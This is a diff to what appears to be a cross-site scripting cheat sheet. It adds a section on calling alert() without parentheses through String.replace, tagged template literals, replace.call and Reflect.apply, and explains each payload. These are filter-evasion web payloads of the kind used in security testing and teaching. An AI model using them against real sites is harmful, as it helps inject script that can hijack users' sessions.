@@ -275,3 +275,25 @@ setTimeout`alert\x28\x29`
 ```
 - Instead of palceholder we can directly pass as an string to evaluate alert.
 
+### String replace:
+The replace() method of String values returns a new string with one, some, or all matches of a pattern replaced by a replacement. The pattern can be a string or a RegExp, and the replacement can be a string or a function called for each match.
+
+- `'a'.replace(/./,alert)` // alert calls
+- we can supply a function for a match.
+
+```
+'a,'.replace`a${alert}`
+```
+- The first argument will be array of strings, hence it will be ["a",""] and we need `a,` to match it and call the alert function.
+
+```
+'a'.replace.call`1${/./}${alert}`
+```
+- We use call function to assign the `this` to tagged temaplate string match of 1 as the regex is /./ single character and the reference is passed to alert.
+
+- Reflect object allows you to perform operations like a function call,set/get operation on any object.
+
+```
+Reflect.apply.call`${alert}${window}${[1337]}`
+```
+
